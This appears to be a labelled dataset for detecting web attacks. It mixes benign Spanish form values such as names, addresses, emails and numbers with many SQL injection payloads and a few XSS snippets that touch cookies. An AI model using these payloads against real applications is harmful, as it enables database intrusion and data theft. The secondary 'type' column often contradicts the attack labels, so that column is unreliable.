Text,attack_type,Label,type
76371566c,norm,0,normal
"1"")) as nbdc where 4444=4444 union all select null,null--",sqli,1,sql
30649909v,norm,0,normal
3669,norm,0,normal
leiza,norm,0,normal
kerber frola,norm,0,normal
7974,norm,0,normal
catalineta,norm,0,normal
99f0nfua6o53,norm,0,normal
castroverde,norm,0,normal
belonne santaella,norm,0,normal
"c/ cordoba, 30",norm,0,normal
disentrica,norm,0,normal
cargaderos 79,norm,0,normal
santasus quirce,norm,0,normal
"1%"");if(7899=7899) select 7899 else drop function zbbp--",sqli,1,sql
sant vicen de castellet,norm,0,normal
89416530m,norm,0,normal
"1"") as rqpp where 9383=9383 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
50408,norm,0,normal
arme!lluela,norm,0,normal
"1') as bfgl where 8959=8959 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
44650,norm,0,normal
1') rlike (select (case when (7689=7689) then 1 else 0x28 end)),sqli,1,sql
biurrun-olcoz,norm,0,normal
"1""))) and elt(1750=7826,7826) and (((""qcro""=""qcro",sqli,1,normal
oate fijo,norm,0,normal
"-3960"")) union all select 7813,7813,7813,7813,7813,7813--",sqli,1,sql
"c/ barriada nueva andalucia, 79, 5?f",norm,0,normal
harmony,norm,0,normal
"1%') or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ('%'='",sqli,1,sql
1' and 7528=2894 and 'qoyw'='qoyw,sqli,1,normal
1%'));select sleep(5) and (('%'=',sqli,1,sql
iracen,norm,0,normal
57757963h,norm,0,normal
"1"" and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ""kfps""=""kfps",sqli,1,normal
1')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('opyp'='opyp,sqli,1,sql
0456219474080004,norm,0,normal
14140,norm,0,normal
"<?import namespace=""t"" implementation=""#default#time2"">",xss,2,normal
purchasi,norm,0,normal
"c/ san salvador, 34, 10?f",norm,0,normal
mamakos@palodegolf.com.rw,norm,0,normal
atilio,norm,0,normal
37796,norm,0,normal
marchena,norm,0,normal
46660,norm,0,normal
93777834a,norm,0,normal
"1);select count(*) from generate_series(1,5000000) and (8997=8997",sqli,1,sql
32219707l,norm,0,normal
"1' in boolean mode) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)#",sqli,1,sql
1' and (3020=3020)*6703,sqli,1,normal
39152269j,norm,0,normal
"1"");begin dbms_lock.sleep(5); end--",sqli,1,sql
proffit,norm,0,normal
"1) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (9112=9112",sqli,1,normal
ntpadmin,norm,0,normal
"-2583"") where 3455=3455 or make_set(9354=9354,7185)--",sqli,1,sql
-1985))) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((1248=1248,sqli,1,sql
"-9361"")) union all select 3112#",sqli,1,sql
1'+(select qydm where 6019=6019;select (case when (2394=4530) then 2394 else 2394*(select 2394 from information_schema.character_sets) end)#,sqli,1,sql
mozek,norm,0,normal
c/ orient 45,norm,0,normal
469,norm,0,normal
1);select sleep(5),sqli,1,sql
-7810 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))-- vuvj,sqli,1,sql
cabana demuner,norm,0,normal
"1"") where 7548=7548;select sleep(5)--",sqli,1,sql
toroborg@cpanelweb.kp,norm,0,normal
1' in boolean mode) rlike (select (case when (1343=1595) then 1 else 0x28 end))#,sqli,1,sql
83217349z,norm,0,normal
boca de hurgano,norm,0,normal
demostrar,norm,0,normal
ru0i0en94?l,norm,0,normal
"isidoro rodriguez acevedo 192, 4h",norm,0,normal
darrieu@redstarz.sv,norm,0,normal
bodo,norm,0,normal
"1' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",sqli,1,normal
pomeroy5,norm,0,normal
23991331p,norm,0,normal
clodoveo,norm,0,normal
san vitero,norm,0,normal
"-2007' where 9157=9157 union all select 9157,9157,9157,9157,9157,9157,9157,9157,9157#",sqli,1,sql
"1""));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,1,sql
87,norm,0,normal
1'))) and sleep(5) and ((('vbck' like 'vbck,sqli,1,normal
6148,norm,0,normal
ductilidad,norm,0,normal
"1 where 2278=2278 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
janet,norm,0,normal
8615,norm,0,normal
26323,norm,0,normal
3068571897789618,norm,0,normal
"1) as wuio where 5312=5312 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
env+olvente,norm,0,normal
48650,norm,0,normal
"1'+(select 'iyvn' where 9358=9358 or elt(6272=6272,sleep(5)))+'",sqli,1,sql
comiso,norm,0,normal
"1"" where 2309=2309 or elt(5873=5873,sleep(5))#",sqli,1,normal
"1' in boolean mode);select * from generate_series(1431,1431,case when (1431=7822) then 1 else 0 end) limit 1--",sqli,1,sql
94,norm,0,normal
torgo,norm,0,normal
hoggatt,norm,0,normal
"1 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1,normal
1')));select sleep(5)#,sqli,1,sql
7839,norm,0,normal
"1'||(select 'jscc' from dual where 3266=3266 and elt(4249=4249,7259))||'",sqli,1,sql
86,norm,0,normal
augusto,norm,0,normal
"1' in boolean mode) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))#",sqli,1,sql
8901603144998796,norm,0,normal
"1%'));iif(5519=4796,1,1/0)",sqli,1,sql
mandrial,norm,0,normal
"1' in boolean mode) or 8421=(select count(*) from generate_series(1,5000000))#",sqli,1,sql
bendex@xavipetit.it,norm,0,normal
"1 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)# dbzk",sqli,1,normal
entrar,norm,0,normal
"doctor diego madrazo, 180",norm,0,normal
"1"" union all select null,null--",sqli,1,sql
velez_hubner5@castigadas.cv,norm,0,normal
car52lit7,norm,0,normal
polvo,norm,0,normal
"1"");select pg_sleep(5)--",sqli,1,sql
micaas,norm,0,normal
"-3436) or elt(1032=1032,3623)",sqli,1,normal
"1)) as rsnb where 3168=3168 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
0671271356251463,norm,0,normal
"1"")));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""ksip"" like ""ksip",sqli,1,sql
wackernagel@tiendasyofertas.je,norm,0,normal
panzer7,norm,0,normal
1';if(8537=7034) select 8537 else drop function vqmp--,sqli,1,sql
correas azeas,norm,0,normal
"1"") as ucex where 5148=5148 order by 1#",sqli,1,normal
furnari pentinat,norm,0,normal
18555,norm,0,normal
-4617'))) or 9323=9323#,sqli,1,normal
"1%"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ('vxqs'='vxqs",sqli,1,normal
"1%"";select * from generate_series(3827,3827,case when (3827=7095) then 1 else 0 end) limit 1--",sqli,1,sql
nicks@guejosgratis.pt,norm,0,normal
sobrecogimiento,norm,0,normal
"1' in boolean mode);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4#",sqli,1,sql
aminda,norm,0,normal
1%')) or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
16340,norm,0,normal
"1'+(select fhbk where 2570=2570 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",sqli,1,sql
5798582876895008,norm,0,normal
villadecanes,norm,0,normal
boggs@cocteleria.dz,norm,0,normal
"1'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('fnna'='fnna",sqli,1,sql
19210,norm,0,normal
12200,norm,0,normal
b23a3io,norm,0,normal
68201502q,norm,0,normal
paleogrfico,norm,0,normal
herner,norm,0,normal
"c/ juan de rihuerga, 0,",norm,0,normal
diafragmar,norm,0,normal
94430620a,norm,0,normal
0981560265462116,norm,0,normal
"1)) as pjjz where 8384=8384 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",sqli,1,sql
tristan,norm,0,normal
41724359j,norm,0,normal
camisa,norm,0,normal
19390,norm,0,normal
d2s32bearse,norm,0,normal
seglar,norm,0,normal
-2233' or (1807=7274)*7274,sqli,1,normal
9590,norm,0,normal
"1%""))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
seymour@evelin.gn,norm,0,normal
"1',(select (case when (1902=5536) then 1 else 1902*(select 1902 from master..sysdatabases) end))",sqli,1,sql
12185,norm,0,normal
"-5996) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",sqli,1,sql
higueruela,norm,0,normal
p811s25,norm,0,normal
"1'||(select 'xjcg' from dual where 5815=5815 union all select null,null,null#",sqli,1,sql
"-9749"" where 7083=7083 or make_set(7577=1182,1182)--",sqli,1,sql
1) as vbli where 5139=5139 and 2782=2625--,sqli,1,sql
calle petunias 34 1-e,norm,0,normal
los caprichos 126,norm,0,normal
hennon,norm,0,normal
-7164%' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and '%'=',sqli,1,sql
alexiana,norm,0,normal
"avda. de pablo iglesias, s/n 2?g",norm,0,normal
puebla de don fadrique,norm,0,normal
1') as bscn where 6907=6907;select (case when (1724=6528) then 1724 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
"1%"")) and 1083=6202",sqli,1,normal
67108468b,norm,0,normal
antirreglamentaria,norm,0,normal
llorador,norm,0,normal
"<div style=""width: expression(document.cookie=true;);"">",xss,2,sql
11954779t,norm,0,normal
2881,norm,0,normal
"1' in boolean mode) or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
doria7@cohel.kz,norm,0,normal
-1217'))) order by 1#,sqli,1,normal
"carretera aravaca a carabanchel, 194 8-e",norm,0,normal
myers@naturalchild.so,norm,0,normal
1%';(select * from (select(sleep(5)))acdk)#,sqli,1,sql
timmons,norm,0,normal
1721621291601250,norm,0,normal
hube@gemas.org.aero,norm,0,normal
rubiano carvajal,norm,0,normal
72981161e,norm,0,normal
"1"") as hoiv where 9708=9708 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1,sql
calle eduard toldra 137 5?a,norm,0,normal
piesa-diestel@hacia.tz,norm,0,normal
36079,norm,0,normal
5176134649632043,norm,0,normal
drabek,norm,0,normal
pasivamente,norm,0,normal
"1"")) or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1"")) and (7467=7962)*7962 and ((""nhld""=""nhld",sqli,1,normal
5861000706039696,norm,0,normal
"alameda de gardn, la",norm,0,normal
calle maigmo 90 4-c,norm,0,normal
"1%""))) or (select * from (select(sleep(5)))sddo)#",sqli,1,sql
2ovi4in,norm,0,normal
ace673,norm,0,normal
terrassa,norm,0,normal
3781036501381167,norm,0,normal
dalia,norm,0,normal
1') where 4949=4949;waitfor delay '0:0:5'--,sqli,1,sql
3099595340897586,norm,0,normal
7633,norm,0,normal
312,norm,0,normal
"1"") where 5196=5196 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
-2981)) or (8459=8459)*4906 and ((4202=4202,sqli,1,normal
45518730m,norm,0,normal
"c/ hulla, 179",norm,0,normal
baqu,norm,0,normal
huertas acosa,norm,0,normal
esquilero,norm,0,normal
"c/ iglesia, 37, 12?c",norm,0,normal
"1"")) union all select null,null,null,null,null,null#",sqli,1,sql
mayo-chandler7@barnicesuv.co,norm,0,normal
1'||(select 'dsjg' where 2402=2402 and 1947=7472--,sqli,1,sql
9668664567247303,norm,0,normal
"1'||(select 'mjkz' where 9430=9430 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users))||'",sqli,1,sql
"1"")) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((""nubc"" like ""nubc",sqli,1,normal
hrenyk,norm,0,normal
1) as cwsi where 7360=7360 or sleep(5)#,sqli,1,normal
"1%'))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
1') as bihs where 4197=4197;select pg_sleep(5)--,sqli,1,sql
-4610')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('hdco'='hdco,sqli,1,sql
13440,norm,0,normal
"-6519')) as tdlt where 5040=5040 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
-4057') order by 1#,sqli,1,normal
ribes cerf,norm,0,normal
manacor,norm,0,normal
alta,norm,0,normal
48483117z,norm,0,normal
04ega9i2a,norm,0,normal
eleni,norm,0,normal
"luis diaz cobea, 98,",norm,0,normal
21254057x,norm,0,normal
38821598j,norm,0,normal
bandad_a,norm,0,normal
6741,norm,0,normal
"1"" and elt(2373=5817,5817) and ""rsdt""=""rsdt",sqli,1,normal
elbal cobo,norm,0,normal
peluffo1@psicoencuentronline.va,norm,0,normal
80537471g,norm,0,normal
"-2314%')) union all select 4612,4612--",sqli,1,sql
ella,norm,0,normal
"los aramburu, 72",norm,0,normal
1) as fhvb where 4008=4008;begin user_lock.sleep(5); end--,sqli,1,sql
retamal de llerena,norm,0,normal
sarri orbe,norm,0,normal
doretta5,norm,0,normal
"1 where 5859=5859 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
0131573485313160,norm,0,normal
membro,norm,0,normal
48600,norm,0,normal
"-4068'))) union all select 9491,9491,9491--",sqli,1,sql
"make_set(8734=8734,sleep(5))",sqli,1,normal
bartoli ferrada,norm,0,normal
rafaela,norm,0,normal
4or6un0,norm,0,normal
">""<body onload=document.cookie=true;>",xss,2,xss
tamerlani@ubikuo.cc,norm,0,normal
"1%"") and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
"avenida rafael cabrera, 24, 8?g",norm,0,normal
1) as ozga where 4002=4002 and 6969=(select 6969 from pg_sleep(5))--,sqli,1,sql
"-3637"" or (8459=8459)*4906",sqli,1,normal
12018831c,norm,0,normal
"1"" where 9829=9829 order by 1#",sqli,1,normal
"1') as ildf where 5545=5545 union all select null,null,null,null#",sqli,1,sql
tybalt,norm,0,normal
daimiel,norm,0,normal
wostrikoff@hojainformativas.gi,norm,0,normal
"<img lowsrc=""javascript:document.cookie=true;"">",xss,2,xss
em,norm,0,normal
celfa,norm,0,normal
c/ hinojo 130 4?c,norm,0,normal
"c/ monardes 155,",norm,0,normal
1') and 4595=4595#,sqli,1,normal
kimbroug,norm,0,normal
"1"") as pwvu where 8267=8267;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",sqli,1,sql
enrico,norm,0,normal
7910538337072686,norm,0,normal
99ortadero,norm,0,normal
jawad,norm,0,normal
40380,norm,0,normal
1386580487506748,norm,0,normal
4658,norm,0,normal
70153244r,norm,0,normal
misut fondevi,norm,0,normal
92,norm,0,normal
"1%""))) union all select null,null,null,null,null,null,null,null,null,null--",sqli,1,sql
"plaa lloreda, 155",norm,0,normal
-1277'))) order by 1--,sqli,1,sql
"1"" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ""ygzq"" like ""ygzq",sqli,1,sql
"1"" where 4978=4978 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
bearse@cdgranadabaila.lv,norm,0,normal
"1'||(select 'tezo' from dual where 4436=4436;select like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",sqli,1,sql
15751165y,norm,0,normal
93sci06i745o,norm,0,normal
60781516z,norm,0,normal
0227003559920538,norm,0,normal
hinojo,norm,0,normal
ninno,norm,0,normal
yoyce@atrioregalos.eu,norm,0,normal
eddisfor4,norm,0,normal
6471,norm,0,normal
49721,norm,0,normal
-5147 or (8459=8459)*4906,sqli,1,normal
petn,norm,0,normal
"-9774'))) union all select 6954,6954,6954#",sqli,1,sql
1';if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
7721560580439665,norm,0,normal
"1%"") procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (""%""=""",sqli,1,normal
-9393' where 3119=3119 or 8571=8571--,sqli,1,sql
isabel,norm,0,normal
"1' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'tmwy'='tmwy",sqli,1,sql
"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"-1487"") as crfi where 2407=2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",sqli,1,sql
naestiberger@biogasworld.rs,norm,0,normal
3375572623430817,norm,0,normal
1%'));select pg_sleep(5) and (('%'=',sqli,1,sql
siomara,norm,0,normal
sant llus,norm,0,normal
"ondulada, 121",norm,0,normal
c84a12a,norm,0,normal
4226046499602528,norm,0,normal
280,norm,0,normal
anest1sica,norm,0,normal
1' or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
azoem$ia,norm,0,normal
beecher@mailboxrussia.gu,norm,0,normal
"calle benifairo, 189, 9?g",norm,0,normal
5867,norm,0,normal
35591968c,norm,0,normal
galende,norm,0,normal
escudero ostria,norm,0,normal
26015420m,norm,0,normal
24174,norm,0,normal
"1 where 7254=7254;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
comprero,norm,0,normal
killan@923.fr,norm,0,normal
"1""))) waitfor delay '0:0:5' and (((""ckht""=""ckht",sqli,1,normal
1%')));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1,sql
valeri arlat,norm,0,normal
cagnoli,norm,0,normal
7441005651932884,norm,0,normal
"1)) as gobw where 3496=3496 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
88341714w,norm,0,normal
"jirafa, 165 7?g",norm,0,normal
4702,norm,0,normal
beaulieu,norm,0,normal
bernad fermoselle,norm,0,normal
"1%"");select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
0n3r3oscura,norm,0,normal
"1'+(select 'otqy' where 2754=2754 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666))+'",sqli,1,sql
4ntrometim13nt6,norm,0,normal
bayliss@joll.tz,norm,0,normal
"c/ la hortensia, s/n",norm,0,normal
"1'||(select 'gikt' where 8447=8447 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
villanueva de san carlos,norm,0,normal
"1')) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (('gydh'='gydh",sqli,1,sql
"-3609"")) as fzyp where 9474=9474 or 9323=9323#",sqli,1,normal
fe4r0g6ent8,norm,0,normal
"1%"")) and sleep(5) and ((""%""=""",sqli,1,normal
-8486%'))) or 8571=8571--,sqli,1,sql
"1%"" or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ""%""=""",sqli,1,sql
vidom.kapatos@discotecateatre.om,norm,0,normal
6091962407544317,norm,0,normal
levert_lightfoot@laschinas.tm,norm,0,normal
"1%"")) union all select null,null,null,null,null,null,null#",sqli,1,sql
villasequilla,norm,0,normal
0213218776616277,norm,0,normal
6120,norm,0,normal
9990220996322149,norm,0,normal
preixens,norm,0,normal
"1"")) rlike (select * from (select(sleep(5)))vwyq)#",sqli,1,sql
garek,norm,0,normal
"1"")) as jikg where 8258=8258 and (3973=1047)*1047--",sqli,1,sql
luettcha,norm,0,normal
santiago de la puebla,norm,0,normal
garmasin,norm,0,normal
"1' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",sqli,1,sql
</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>,xss,2,normal
"-5904"" where 9782=9782 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",sqli,1,sql
24575080v,norm,0,normal
bailn,norm,0,normal
"1' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and 'cotv' like 'cotv",sqli,1,normal
lilah,norm,0,normal
parmenia,norm,0,normal
"-8026 or elt(8434=4516,4516)# bsqo",sqli,1,normal
"-5198))) union all select 7089,7089,7089,7089,7089,7089,7089,7089#",sqli,1,sql
kunkel,norm,0,normal
"1"")) as exzo where 7518=7518 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",sqli,1,sql
yalile,norm,0,normal
9607018610591675,norm,0,normal
">""<div onmouseover=""document.cookie=true;"">",xss,2,sql
"1"") and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"-3525"" where 3522=3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#",sqli,1,sql
"1%')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('%'='",sqli,1,normal
"1'+(select 'yfrs' where 4388=4388 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
33216,norm,0,normal
latin,norm,0,normal
"1) as nioj where 9703=9703;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
lesaka,norm,0,normal
yeti llamus,norm,0,normal
lester_muenster@erasmusrooms.org,norm,0,normal
"1"") and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (""ijop""=""ijop",sqli,1,sql
"1"") and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (""xsfg"" like ""xsfg",sqli,1,sql
"-1634%' union all select 5937,5937,5937,5937--",sqli,1,sql
edouard,norm,0,normal
"1"") where 5298=5298 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",sqli,1,sql
"1) where 1415=1415 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,1,sql
"calle cortafell, 74",norm,0,normal
fedro,norm,0,normal
-9534%' or 3038=3038,sqli,1,normal
"1') as uytv where 7875=7875 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
yates@tgcprint.ax,norm,0,normal
cribada,norm,0,normal
5348,norm,0,normal
4514955608621300,norm,0,normal
nava de roa,norm,0,normal
dirosario@errebebe.as,norm,0,normal
cyril,norm,0,normal
mannkopf.gray@ajuntamentbcn2-0.il,norm,0,normal
jaiba,norm,0,normal
25i6la,norm,0,normal
gabold@cartasdeajuste.yu,norm,0,normal
5889772581195146,norm,0,normal
-1<script <b>document.cookie=true;</script>,xss,2,xss
enmade6ar,norm,0,normal
penningt,norm,0,normal
"1) union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1);create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
nadir,norm,0,normal
"-7007) union all select 6704,6704--",sqli,1,sql
8043015940180984,norm,0,normal
"1'))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((('jhle' like 'jhle",sqli,1,normal
-7387'))) order by 1--,sqli,1,sql
nentwich,norm,0,normal
"calle don juan de malaga, 170,",norm,0,normal
7242,norm,0,normal
"-7272"") union all select 9163,9163,9163,9163,9163,9163,9163--",sqli,1,sql
jamil,norm,0,normal
tenna1,norm,0,normal
"-1772)) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((8904=8904",sqli,1,sql
sadeghi,norm,0,normal
62386870z,norm,0,normal
planos lazos,norm,0,normal
urchins@waikilu.mg,norm,0,normal
"torre de esteban hambrn, la",norm,0,normal
32566111c,norm,0,normal
1);if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
0577312599845778,norm,0,normal
5746287514997171,norm,0,normal
"1"")) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""nobt""=""nobt",sqli,1,sql
jargon_,norm,0,normal
6302817063301722,norm,0,normal
-4961') or 3038=3038,sqli,1,normal
barnhill,norm,0,normal
"charca verde 165,",norm,0,normal
"cerollera, la",norm,0,normal
gwenda,norm,0,normal
"1%'));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('%'='",sqli,1,sql
"1%""));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
merl,norm,0,normal
20654328y,norm,0,normal
torre val de san pedro,norm,0,normal
